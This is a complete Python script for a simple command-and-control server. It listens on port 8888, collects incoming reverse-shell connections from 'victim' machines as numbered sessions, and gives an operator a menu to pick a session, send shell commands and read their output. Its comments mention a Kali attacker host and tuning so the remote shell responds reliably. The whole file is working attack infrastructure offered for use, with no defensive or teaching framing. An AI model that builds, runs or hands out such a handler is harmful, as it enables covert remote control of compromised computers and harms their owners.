import socket
import threading
import sys
import time
# Global dictionary to store active sessions
# Format: {id: [client_socket, client_address]}
targets = {}
next_id = 0

def handle_incoming_connections(server_socket):
    """
    Background thread to accept new connections without blocking the main menu.
    """
    global next_id
    while True:
        try:
            client, addr = server_socket.accept()
            # Set a timeout so the shell doesn't hang if a command produces no output
            client.settimeout(2.0) 
            print(f"\n[+] New Connection: {addr[0]}")
            
            targets[next_id] = [client, addr]
            next_id += 1
            print(f"[*] Session {next_id - 1} saved. Press ENTER to refresh prompt.")
        except:
            break

def start_server(ip, port):
    """
    Sets up the listener.
    """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((ip, port))
        server.listen(5)
        print(f"[*] C2 Server listening on {ip}:{port}")
    except Exception as e:
        print(f"[-] Error binding: {e}")
        sys.exit(1)

    # Start the listener in a background thread
    t = threading.Thread(target=handle_incoming_connections, args=(server,))
    t.daemon = True # Kills thread when main program exits
    t.start()

def interact_session(session_id):
    if session_id not in targets:
        print("[-] Invalid Session ID")
        return

    conn = targets[session_id][0]
    print(f"[*] Interacting with Session {session_id}")
    print("[*] Type 'exit' to background, 'kill' to close.")

    while True:
        try:
            command = input(f"Shell({session_id})> ")
            
            if command.strip() == "": continue
            if command.lower() == 'exit':
                break
            if command.lower() == 'kill':
                conn.close()
                del targets[session_id]
                break

            # --- FIX 1: FLUSH OLD DATA ---
            # Before we send a new command, we check if there is any 
            # leftover data from the previous command and throw it away.
            try:
                conn.setblocking(False) # Don't wait, just check
                while True:
                    d = conn.recv(1024)
                    if not d: break
            except:
                pass # Buffer is now empty
            
            # Reset socket to blocking mode with a timeout for the actual response
            conn.setblocking(True)
            conn.settimeout(1.0) 

            # --- SEND COMMAND ---
            conn.send(command.encode() + b'\n')

            # --- FIX 2: WAIT FOR EXECUTION ---
            # Give the victim machine a moment to process the command
            # This prevents us from reading before the data is ready.
            time.sleep(0.5) 

            # --- RECEIVE NEW RESPONSE ---
            response = ""
            while True:
                try:
                    chunk = conn.recv(4096).decode()
                    if not chunk: break
                    response += chunk
                except socket.timeout:
                    # Timeout means the shell has stopped sending output
                    break
            
            print(response)

        except Exception as e:
            print(f"[-] Connection Error: {e}")
            # If the connection actually died, remove it from list
            if session_id in targets:
                del targets[session_id]
            break

def main_menu():
    """
    The main operator interface (CLI).
    """
    print("--- Simple Python C2 Server ---")
    print("Commands: list, use <id>, exit")
    
    while True:
        try:
            cmd = input("C2_Server> ").split()
            if not cmd: continue

            if cmd[0] == 'list':
                print("\nActive Sessions:")
                print("ID   IP Address")
                print("---  ----------")
                for tid, info in targets.items():
                    print(f"{tid}    {info[1][0]}")
                print("")

            elif cmd[0] == 'use':
                if len(cmd) > 1:
                    interact_session(int(cmd[1]))
                else:
                    print("[-] Usage: use <id>")

            elif cmd[0] == 'exit':
                print("[*] Shutting down C2...")
                sys.exit(0)

            else:
                print("[-] Unknown command")
        
        except ValueError:
            print("[-] Invalid ID format")
        except KeyboardInterrupt:
            print("\n[*] Exiting...")
            sys.exit(0)

if __name__ == "__main__":
    # Change these to match your Kali IP and desired port
    HOST_IP = "0.0.0.0" 
    PORT = 8888
    
    start_server(HOST_IP, PORT)
    main_menu()